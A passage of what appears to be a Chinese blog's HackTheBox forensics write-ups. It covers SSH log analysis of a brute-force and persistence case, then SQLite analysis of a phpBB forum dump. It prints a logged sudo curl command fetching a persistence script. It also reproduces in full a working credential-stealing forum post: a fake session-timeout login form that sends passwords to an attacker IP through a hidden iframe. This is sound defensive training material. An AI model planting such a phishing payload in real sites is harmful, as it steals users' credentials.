<h1 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h1><p><strong>攻击者添加了一个新用户作为服务器上持久性策略的一部分，并为该新用户帐户授予了更高的权限。该帐户的名称是什么？</strong></p>
<p>很明显给了<code>cyberjunkie</code>用户shell的权限</p>
<p><img src="/article/Brutus-HackTheBox/image-20240421230548524.png"></p>
<h1 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h1><p><strong>用于持久性的 MITRE ATT&amp;CK 子技术 ID 是什么？</strong></p>
<p>善于使用搜索引擎</p>
<p><img src="/article/Brutus-HackTheBox/image-20240421230752033.png"></p>
<h1 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h1><p><strong>根据先前确认的身份验证时间和 auth.log 中的会话结束，攻击者的第一个 SSH 会话持续了多长时间？ （秒）</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2</span><br><span class="line">Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184</span><br></pre></td></tr></table></figure>

<p>不过日志上时间不准确，实际上登陆时间为<code>06:32:45</code>，所以持续了279秒</p>
<h1 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h1><p><strong>攻击者登录他们的后门帐户并利用他们的更高权限下载脚本。使用 sudo 执行的完整命令是什么？</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>日志分析</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Bumblebee-HackTheBox</title>
    <url>/article/Bumblebee-HackTheBox.html</url>
    <content><![CDATA[<p>对sqlite3数据库文件进行日志分析</p>
<span id="more"></span>

<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote>
<p>外部承包商通过访客 Wi-Fi 访问了 Forela 的内部论坛，他们似乎窃取了管理用户的凭据！我们附上了论坛的一些日志和 sqlite3 格式的完整数据库转储，以帮助您进行调查。</p>
</blockquote>
<h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><p><strong>外部承包商的用户名是什么？</strong></p>
<p>解压文件得到log日志和sqlite3数据库文件</p>
<p><img src="/article/Bumblebee-HackTheBox/image-20240419095217173.png"></p>
<p>使用sqlite打开</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlite incident.sqlite3</span><br></pre></td></tr></table></figure>

<p>然后<code>.tables</code>查看所有表找到<code>phpbb_users</code>，那么我们查看下字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma table_info(phpbb_users);</span><br></pre></td></tr></table></figure>

<p>发现有<code>username</code>和<code>user_password</code></p>
<p><img src="/article/Bumblebee-HackTheBox/image-20240419095103867.png"></p>
<p>直接查询</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select username,user_password from phpbb_users;</span><br></pre></td></tr></table></figure>

<p>注意到最下面的<code>apoole1</code></p>
<p><img src="/article/Bumblebee-HackTheBox/image-20240419095434129.png"></p>
<h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><p><strong>承包商使用什么 IP 地址创建帐户？</strong></p>
<p>刚刚查看表的字段里有<code>user_ip</code>，查询得到ip为<code>10.10.0.78</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user_ip from phpbb_users where username=&quot;apoole1&quot;;</span><br></pre></td></tr></table></figure>

<h1 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h1><p><strong>承包商发布的恶意帖子的 post_id 是什么？</strong></p>
<p>我们找到<code>phpbb_posts</code>，然后查询一下</p>
<p><img src="/article/Bumblebee-HackTheBox/image-20240419100317816.png"></p>
<p>很明显id为9的内容很多</p>
<h1 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h1><p><strong>凭据窃取者将其数据发送到的完整 URI 是什么？</strong></p>
<p>我们将前一问的表单内容下载下来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select post_text from phpbb_posts where post_id=9;</span><br></pre></td></tr></table></figure>

<p>内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123; z-index: 100;&#125;.modal &#123; position:fixed; top:0; left:0; height:100%;</span><br><span class="line">        width:100%; z-index:101; background-color:white; opacity:1;&#125;.modal.hidden</span><br><span class="line">        &#123; visibility: hidden;&#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">        function sethidden() &#123;</span><br><span class="line">            const d = new Date();</span><br><span class="line">            d.setTime(d.getTime() + (24 * 60 * 60 * 1000));</span><br><span class="line">            let expires = &quot;expires=&quot; + d.toUTCString();</span><br><span class="line">            document.cookie = &quot;phpbb_token=1;&quot; + expires + &quot;;&quot;;</span><br><span class="line">            var modal = document.getElementById(&#x27;zbzbz1234&#x27;);</span><br><span class="line">            modal.classList.add(&quot;hidden&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        document.addEventListener(&quot;DOMContentLoaded&quot;,</span><br><span class="line">        function(event) &#123;</span><br><span class="line">            let cookieexists = false;</span><br><span class="line">            let name = &quot;phpbb_token=&quot;;</span><br><span class="line">            let cookies = decodeURIComponent(document.cookie);</span><br><span class="line">            let ca = cookies.split(&#x27;;&#x27;);</span><br><span class="line">            for (let i = 0; i &lt; ca.length; i++) &#123;</span><br><span class="line">                let c = ca[i];</span><br><span class="line">                while (c.charAt(0) == &#x27; &#x27;) &#123;</span><br><span class="line">                    c = c.substring(1);</span><br><span class="line">                &#125;</span><br><span class="line">                if (c.indexOf(name) == 0) &#123;</span><br><span class="line">                    cookieexists = true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if (cookieexists) &#123;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">            var modal = document.getElementById(&#x27;zbzbz1234&#x27;);</span><br><span class="line">            modal.classList.remove(&quot;hidden&quot;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;iframe name=&quot;hiddenframe&quot; id=&quot;hiddenframe&quot; style=&quot;display:none&quot;&gt;</span><br><span class="line">    &lt;/iframe&gt;</span><br><span class="line">    &lt;div class=&quot;modal hidden&quot; id=&quot;zbzbz1234&quot; onload=&quot;shouldshow&quot;&gt;</span><br><span class="line">        &lt;div id=&quot;wrap&quot; class=&quot;wrap&quot;&gt;</span><br><span class="line">            &lt;a id=&quot;top&quot; class=&quot;top-anchor&quot; accesskey=&quot;t&quot;&gt;</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line">            &lt;div id=&quot;page-header&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;headerbar&quot; role=&quot;banner&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">                        &lt;div id=&quot;site-description&quot; class=&quot;site-description&quot;&gt;</span><br><span class="line">                            &lt;a id=&quot;logo&quot; class=&quot;logo&quot; href=&quot;./index.php&quot; title=&quot;Board index&quot;&gt;</span><br><span class="line">                                &lt;span class=&quot;site_logo&quot;&gt;</span><br><span class="line">                                &lt;/span&gt;</span><br><span class="line">                            &lt;/a&gt;</span><br><span class="line">                            &lt;h1&gt;</span><br><span class="line">                                forum.forela.co.uk</span><br><span class="line">                            &lt;/h1&gt;</span><br><span class="line">                            &lt;p&gt;</span><br><span class="line">                                Forela internal forum</span><br><span class="line">                            &lt;/p&gt;</span><br><span class="line">                            &lt;p class=&quot;skiplink&quot;&gt;</span><br><span class="line">                                &lt;a href=&quot;#start_here&quot;&gt;</span><br><span class="line">                                    Skip to content</span><br><span class="line">                                &lt;/a&gt;</span><br><span class="line">                            &lt;/p&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div id=&quot;search-box&quot; class=&quot;search-box search-header&quot; role=&quot;search&quot;&gt;</span><br><span class="line">                            &lt;form action=&quot;./search.php&quot; method=&quot;get&quot; id=&quot;search1&quot;&gt;</span><br><span class="line">                                &lt;fieldset&gt;</span><br><span class="line">                                    &lt;input name=&quot;keywords&quot; id=&quot;keywords1&quot; type=&quot;search&quot; maxlength=&quot;128&quot; title=&quot;Search for keywords&quot;</span><br><span class="line">                                    class=&quot;inputbox search tiny&quot; size=&quot;20&quot; value=&quot;&quot; placeholder=&quot;Search…&quot;&gt;</span><br><span class="line">                                    &lt;button class=&quot;button button-search&quot; type=&quot;submit&quot; title=&quot;Search&quot;&gt;</span><br><span class="line">                                        &lt;i class=&quot;icon fa-search fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                        &lt;/i&gt;</span><br><span class="line">                                        &lt;span class=&quot;sr-only&quot;&gt;</span><br><span class="line">                                            Search</span><br><span class="line">                                        &lt;/span&gt;</span><br><span class="line">                                    &lt;/button&gt;</span><br><span class="line">                                    &lt;a href=&quot;./search.php&quot; class=&quot;button button-search-end&quot; title=&quot;Advanced search&quot;&gt;</span><br><span class="line">                                        &lt;i class=&quot;icon fa-cog fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                        &lt;/i&gt;</span><br><span class="line">                                        &lt;span class=&quot;sr-only&quot;&gt;</span><br><span class="line">                                            Advanced search</span><br><span class="line">                                        &lt;/span&gt;</span><br><span class="line">                                    &lt;/a&gt;</span><br><span class="line">                                &lt;/fieldset&gt;</span><br><span class="line">                            &lt;/form&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class=&quot;navbar&quot; role=&quot;navigation&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">                        &lt;ul id=&quot;nav-main&quot; class=&quot;nav-main linklist&quot; role=&quot;menubar&quot;&gt;</span><br><span class="line">                            &lt;li id=&quot;quick-links&quot; class=&quot;quick-links dropdown-container responsive-menu&quot;</span><br><span class="line">                            data-skip-responsive=&quot;true&quot;&gt;</span><br><span class="line">                                &lt;a href=&quot;#&quot; class=&quot;dropdown-trigger dropdown-toggle&quot;&gt;</span><br><span class="line">                                    &lt;i class=&quot;icon fa-bars fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;/i&gt;</span><br><span class="line">                                    &lt;span&gt;</span><br><span class="line">                                        Quick links</span><br><span class="line">                                    &lt;/span&gt;</span><br><span class="line">                                &lt;/a&gt;</span><br><span class="line">                                &lt;div class=&quot;dropdown&quot;&gt;</span><br><span class="line">                                    &lt;div class=&quot;pointer&quot;&gt;</span><br><span class="line">                                        &lt;div class=&quot;pointer-inner&quot;&gt;</span><br><span class="line">                                        &lt;/div&gt;</span><br><span class="line">                                    &lt;/div&gt;</span><br><span class="line">                                    &lt;ul class=&quot;dropdown-contents&quot; role=&quot;menu&quot;&gt;</span><br><span class="line">                                        &lt;li class=&quot;separator&quot;&gt;</span><br><span class="line">                                        &lt;/li&gt;</span><br><span class="line">                                        &lt;li&gt;</span><br><span class="line">                                            &lt;a href=&quot;./search.php?search_id=unanswered&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                                &lt;i class=&quot;icon fa-file-o fa-fw icon-gray&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                                &lt;/i&gt;</span><br><span class="line">                                                &lt;span&gt;</span><br><span class="line">                                                    Unanswered topics</span><br><span class="line">                                                &lt;/span&gt;</span><br><span class="line">                                            &lt;/a&gt;</span><br><span class="line">                                        &lt;/li&gt;</span><br><span class="line">                                        &lt;li&gt;</span><br><span class="line">                                            &lt;a href=&quot;./search.php?search_id=active_topics&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                                &lt;i class=&quot;icon fa-file-o fa-fw icon-blue&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                                &lt;/i&gt;</span><br><span class="line">                                                &lt;span&gt;</span><br><span class="line">                                                    Active topics</span><br><span class="line">                                                &lt;/span&gt;</span><br><span class="line">                                            &lt;/a&gt;</span><br><span class="line">                                        &lt;/li&gt;</span><br><span class="line">                                        &lt;li class=&quot;separator&quot;&gt;</span><br><span class="line">                                        &lt;/li&gt;</span><br><span class="line">                                        &lt;li&gt;</span><br><span class="line">                                            &lt;a href=&quot;./search.php&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                                &lt;i class=&quot;icon fa-search fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                                &lt;/i&gt;</span><br><span class="line">                                                &lt;span&gt;</span><br><span class="line">                                                    Search</span><br><span class="line">                                                &lt;/span&gt;</span><br><span class="line">                                            &lt;/a&gt;</span><br><span class="line">                                        &lt;/li&gt;</span><br><span class="line">                                        &lt;li class=&quot;separator&quot;&gt;</span><br><span class="line">                                        &lt;/li&gt;</span><br><span class="line">                                    &lt;/ul&gt;</span><br><span class="line">                                &lt;/div&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                            &lt;li data-skip-responsive=&quot;true&quot;&gt;</span><br><span class="line">                                &lt;a href=&quot;/phpBB3/app.php/help/faq&quot; rel=&quot;help&quot; title=&quot;Frequently Asked Questions&quot;</span><br><span class="line">                                role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                    &lt;i class=&quot;icon fa-question-circle fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;/i&gt;</span><br><span class="line">                                    &lt;span&gt;</span><br><span class="line">                                        FAQ</span><br><span class="line">                                    &lt;/span&gt;</span><br><span class="line">                                &lt;/a&gt;</span><br><span class="line">                                &lt;li class=&quot;rightside&quot; data-skip-responsive=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;a href=&quot;./ucp.php?mode=login&quot; title=&quot;Login&quot; accesskey=&quot;x&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                        &lt;i class=&quot;icon fa-power-off fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                        &lt;/i&gt;</span><br><span class="line">                                        &lt;span&gt;</span><br><span class="line">                                            Login</span><br><span class="line">                                        &lt;/span&gt;</span><br><span class="line">                                    &lt;/a&gt;</span><br><span class="line">                                &lt;/li&gt;</span><br><span class="line">                                &lt;li class=&quot;rightside&quot; data-skip-responsive=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;a href=&quot;./ucp.php?mode=register&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                        &lt;i class=&quot;icon fa-pencil-square-o  fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                        &lt;/i&gt;</span><br><span class="line">                                        &lt;span&gt;</span><br><span class="line">                                            Register</span><br><span class="line">                                        &lt;/span&gt;</span><br><span class="line">                                    &lt;/a&gt;</span><br><span class="line">                                &lt;/li&gt;</span><br><span class="line">                            &lt;/li data-skip-responsive=&quot;true&quot;&gt;</span><br><span class="line">                        &lt;/ul&gt;</span><br><span class="line">                        &lt;ul id=&quot;nav-breadcrumbs&quot; class=&quot;nav-breadcrumbs linklist navlinks&quot; role=&quot;menubar&quot;&gt;</span><br><span class="line">                            &lt;li class=&quot;breadcrumbs&quot; itemscope=&quot;&quot; itemtype=&quot;http://schema.org/BreadcrumbList&quot;</span><br><span class="line">                            style=&quot;max-width: 936px;&quot;&gt;</span><br><span class="line">                                &lt;span class=&quot;crumb&quot; itemtype=&quot;http://schema.org/ListItem&quot; itemprop=&quot;itemListElement&quot;</span><br><span class="line">                                itemscope=&quot;&quot;&gt;</span><br><span class="line">                                    &lt;a href=&quot;./index.php&quot; itemtype=&quot;https://schema.org/Thing&quot; itemprop=&quot;item&quot;</span><br><span class="line">                                    accesskey=&quot;h&quot; data-navbar-reference=&quot;index&quot; title=&quot;Board index&quot;&gt;</span><br><span class="line">                                        &lt;i class=&quot;icon fa-home fa-fw&quot;&gt;</span><br><span class="line">                                        &lt;/i&gt;</span><br><span class="line">                                        &lt;span itemprop=&quot;name&quot;&gt;</span><br><span class="line">                                            Board index</span><br><span class="line">                                        &lt;/span&gt;</span><br><span class="line">                                    &lt;/a&gt;</span><br><span class="line">                                    &lt;meta itemprop=&quot;position&quot; content=&quot;1&quot;&gt;</span><br><span class="line">                                &lt;/span&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                            &lt;li class=&quot;rightside responsive-search&quot;&gt;</span><br><span class="line">                                &lt;a href=&quot;./search.php&quot; title=&quot;View the advanced search options&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                    &lt;i class=&quot;icon fa-search fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;/i&gt;</span><br><span class="line">                                    &lt;span class=&quot;sr-only&quot;&gt;</span><br><span class="line">                                        Search</span><br><span class="line">                                    &lt;/span&gt;</span><br><span class="line">                                &lt;/a&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                        &lt;/ul&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;a id=&quot;start_here&quot; class=&quot;anchor&quot;&gt;</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line">            &lt;div id=&quot;page-body&quot; class=&quot;page-body&quot; role=&quot;main&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;panel&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">                        &lt;div class=&quot;content&quot;&gt;</span><br><span class="line">                            &lt;h3&gt;</span><br><span class="line">                                Session Timeout</span><br><span class="line">                            &lt;/h3&gt;</span><br><span class="line">                            &lt;br/&gt;</span><br><span class="line">                            &lt;br/&gt;</span><br><span class="line">                            &lt;p&gt;</span><br><span class="line">                                Your session token has timed out in order to proceed you must login again.</span><br><span class="line">                            &lt;/p&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;form action=&quot;http://10.10.0.78/update.php&quot; method=&quot;post&quot; id=&quot;login&quot; data-focus=&quot;username&quot;</span><br><span class="line">                target=&quot;hiddenframe&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;panel&quot;&gt;</span><br><span class="line">                        &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">                            &lt;div class=&quot;content&quot;&gt;</span><br><span class="line">                                &lt;h2 class=&quot;login-title&quot;&gt;</span><br><span class="line">                                    Login</span><br><span class="line">                                &lt;/h2&gt;</span><br><span class="line">                                &lt;fieldset class=&quot;fields1&quot;&gt;</span><br><span class="line">                                    &lt;dl&gt;</span><br><span class="line">                                        &lt;dt&gt;</span><br><span class="line">                                            &lt;label for=&quot;username&quot;&gt;</span><br><span class="line">                                                Username:</span><br><span class="line">                                            &lt;/label&gt;</span><br><span class="line">                                        &lt;/dt&gt;</span><br><span class="line">                                        &lt;dd&gt;</span><br><span class="line">                                            &lt;input type=&quot;text&quot; tabindex=&quot;1&quot; name=&quot;username&quot; id=&quot;username&quot; size=&quot;25&quot;</span><br><span class="line">                                            value=&quot;&quot; class=&quot;inputbox autowidth&quot;&gt;</span><br><span class="line">                                        &lt;/dd&gt;</span><br><span class="line">                                    &lt;/dl&gt;</span><br><span class="line">                                    &lt;dl&gt;</span><br><span class="line">                                        &lt;dt&gt;</span><br><span class="line">                                            &lt;label for=&quot;password&quot;&gt;</span><br><span class="line">                                                Password:</span><br><span class="line">                                            &lt;/label&gt;</span><br><span class="line">                                        &lt;/dt&gt;</span><br><span class="line">                                        &lt;dd&gt;</span><br><span class="line">                                            &lt;input type=&quot;password&quot; tabindex=&quot;2&quot; id=&quot;password&quot; name=&quot;password&quot; size=&quot;25&quot;</span><br><span class="line">                                            class=&quot;inputbox autowidth&quot; autocomplete=&quot;off&quot;&gt;</span><br><span class="line">                                        &lt;/dd&gt;</span><br><span class="line">                                    &lt;/dl&gt;</span><br><span class="line">                                    &lt;dl&gt;</span><br><span class="line">                                        &lt;dd&gt;</span><br><span class="line">                                            &lt;label for=&quot;autologin&quot;&gt;</span><br><span class="line">                                                &lt;input type=&quot;checkbox&quot; name=&quot;autologin&quot; id=&quot;autologin&quot; tabindex=&quot;4&quot;&gt;</span><br><span class="line">                                                Remember me</span><br><span class="line">                                            &lt;/label&gt;</span><br><span class="line">                                        &lt;/dd&gt;</span><br><span class="line">                                        &lt;dd&gt;</span><br><span class="line">                                            &lt;label for=&quot;viewonline&quot;&gt;</span><br><span class="line">                                                &lt;input type=&quot;checkbox&quot; name=&quot;viewonline&quot; id=&quot;viewonline&quot; tabindex=&quot;5&quot;&gt;</span><br><span class="line">                                                Hide my online status this session</span><br><span class="line">                                            &lt;/label&gt;</span><br><span class="line">                                        &lt;/dd&gt;</span><br><span class="line">                                    &lt;/dl&gt;</span><br><span class="line">                                    &lt;dl&gt;</span><br><span class="line">                                        &lt;dt&gt;</span><br><span class="line">                                            &amp;nbsp;</span><br><span class="line">                                        &lt;/dt&gt;</span><br><span class="line">                                        &lt;dd&gt;</span><br><span class="line">                                            &lt;input type=&quot;submit&quot; name=&quot;login&quot; tabindex=&quot;6&quot; value=&quot;Login&quot; class=&quot;button1&quot;</span><br><span class="line">                                            onclick=&quot;sethidden()&quot;&gt;</span><br><span class="line">                                        &lt;/dd&gt;</span><br><span class="line">                                    &lt;/dl&gt;</span><br><span class="line">                                &lt;/fieldset class=&quot;fields1&quot;&gt;</span><br><span class="line">                            &lt;/div&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/form&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div id=&quot;page-footer&quot; class=&quot;page-footer&quot; role=&quot;contentinfo&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;navbar&quot; role=&quot;navigation&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">                        &lt;ul id=&quot;nav-footer&quot; class=&quot;nav-footer linklist&quot; role=&quot;menubar&quot;&gt;</span><br><span class="line">                            &lt;li class=&quot;breadcrumbs&quot;&gt;</span><br><span class="line">                                &lt;span class=&quot;crumb&quot;&gt;</span><br><span class="line">                                    &lt;a href=&quot;./index.php&quot; data-navbar-reference=&quot;index&quot; title=&quot;Board index&quot;&gt;</span><br><span class="line">                                        &lt;i class=&quot;icon fa-home fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                        &lt;/i&gt;</span><br><span class="line">                                        &lt;span&gt;</span><br><span class="line">                                            Board index</span><br><span class="line">                                        &lt;/span&gt;</span><br><span class="line">                                    &lt;/a&gt;</span><br><span class="line">                                &lt;/span&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                            &lt;li class=&quot;responsive-menu hidden rightside dropdown-container&quot;&gt;</span><br><span class="line">                                &lt;a href=&quot;javascript:void(0);&quot; class=&quot;js-responsive-menu-link responsive-menu-link dropdown-toggle&quot;&gt;</span><br><span class="line">                                    &lt;i class=&quot;icon fa-bars fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;/i&gt;</span><br><span class="line">                                &lt;/a&gt;</span><br><span class="line">                                &lt;div class=&quot;dropdown&quot;&gt;</span><br><span class="line">                                    &lt;div class=&quot;pointer&quot;&gt;</span><br><span class="line">                                        &lt;div class=&quot;pointer-inner&quot;&gt;</span><br><span class="line">                                        &lt;/div&gt;</span><br><span class="line">                                    &lt;/div&gt;</span><br><span class="line">                                    &lt;ul class=&quot;dropdown-contents&quot;&gt;</span><br><span class="line">                                    &lt;/ul&gt;</span><br><span class="line">                                &lt;/div&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                            &lt;li class=&quot;rightside&quot;&gt;</span><br><span class="line">                                All times are</span><br><span class="line">                                &lt;span title=&quot;UTC&quot;&gt;</span><br><span class="line">                                    UTC</span><br><span class="line">                                &lt;/span&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                            &lt;li class=&quot;rightside&quot;&gt;</span><br><span class="line">                                &lt;a href=&quot;./ucp.php?mode=delete_cookies&quot; data-ajax=&quot;true&quot; data-refresh=&quot;true&quot;</span><br><span class="line">                                role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                    &lt;i class=&quot;icon fa-trash fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;/i&gt;</span><br><span class="line">                                    &lt;span&gt;</span><br><span class="line">                                        Delete cookies</span><br><span class="line">                                    &lt;/span&gt;</span><br><span class="line">                                &lt;/a&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                        &lt;/ul&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class=&quot;copyright&quot;&gt;</span><br><span class="line">                    &lt;p class=&quot;footer-row&quot;&gt;</span><br><span class="line">                        &lt;span class=&quot;footer-copyright&quot;&gt;</span><br><span class="line">                            Powered by</span><br><span class="line">                            &lt;a href=&quot;https://www.phpbb.com/&quot;&gt;</span><br><span class="line">                                phpBB</span><br><span class="line">                            &lt;/a&gt;</span><br><span class="line">                            ® Forum Software © phpBB Limited</span><br><span class="line">                        &lt;/span&gt;</span><br><span class="line">                    &lt;/p&gt;</span><br><span class="line">                    &lt;p class=&quot;footer-row&quot;&gt;</span><br><span class="line">                        &lt;a class=&quot;footer-link&quot; href=&quot;./ucp.php?mode=privacy&quot; title=&quot;Privacy&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                            &lt;span class=&quot;footer-link-text&quot;&gt;</span><br><span class="line">                                Privacy</span><br><span class="line">                            &lt;/span&gt;</span><br><span class="line">                        &lt;/a&gt;</span><br><span class="line">                        |</span><br><span class="line">                        &lt;a class=&quot;footer-link&quot; href=&quot;./ucp.php?mode=terms&quot; title=&quot;Terms&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                            &lt;span class=&quot;footer-link-text&quot;&gt;</span><br><span class="line">                                Terms</span><br><span class="line">                            &lt;/span&gt;</span><br><span class="line">                        &lt;/a&gt;</span><br><span class="line">                    &lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div id=&quot;darkenwrapper&quot; class=&quot;darkenwrapper&quot; data-ajax-error-title=&quot;AJAX error&quot;</span><br><span class="line">                data-ajax-error-text=&quot;Something went wrong when processing your request.&quot;</span><br><span class="line">                data-ajax-error-text-abort=&quot;User aborted request.&quot; data-ajax-error-text-timeout=&quot;Your request timed out; please try again.&quot;</span><br><span class="line">                data-ajax-error-text-parsererror=&quot;Something went wrong with the request and the server returned an invalid reply.&quot;&gt;</span><br><span class="line">                    &lt;div id=&quot;darken&quot; class=&quot;darken&quot;&gt;</span><br><span class="line">                        &amp;nbsp;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div id=&quot;phpbb_alert&quot; class=&quot;phpbb_alert&quot; data-l-err=&quot;Error&quot; data-l-timeout-processing-req=&quot;Request timed out.&quot;&gt;</span><br><span class="line">                    &lt;a href=&quot;#&quot; class=&quot;alert_close&quot;&gt;</span><br><span class="line">                        &lt;i class=&quot;icon fa-times-circle fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                        &lt;/i&gt;</span><br><span class="line">                    &lt;/a&gt;</span><br><span class="line">                    &lt;h3 class=&quot;alert_title&quot;&gt;</span><br><span class="line">                        &amp;nbsp;</span><br><span class="line">                    &lt;/h3&gt;</span><br><span class="line">                    &lt;p class=&quot;alert_text&quot;&gt;</span><br><span class="line">                    &lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div id=&quot;phpbb_confirm&quot; class=&quot;phpbb_alert&quot;&gt;</span><br><span class="line">                    &lt;a href=&quot;#&quot; class=&quot;alert_close&quot;&gt;</span><br><span class="line">                        &lt;i class=&quot;icon fa-times-circle fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                        &lt;/i&gt;</span><br><span class="line">                    &lt;/a&gt;</span><br><span class="line">                    &lt;div class=&quot;alert_text&quot;&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            &lt;a id=&quot;bottom&quot; class=&quot;anchor&quot; accesskey=&quot;z&quot;&gt;</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line">            &lt;img src=&quot;./cron.php?cron_type=cron.task.core.tidy_warnings&quot; width=&quot;1&quot;</span><br><span class="line">            height=&quot;1&quot; alt=&quot;cron&quot;&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;span&gt;</span><br><span class="line">        Greetings everyone,</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        I am just a visiting IT Contractor, 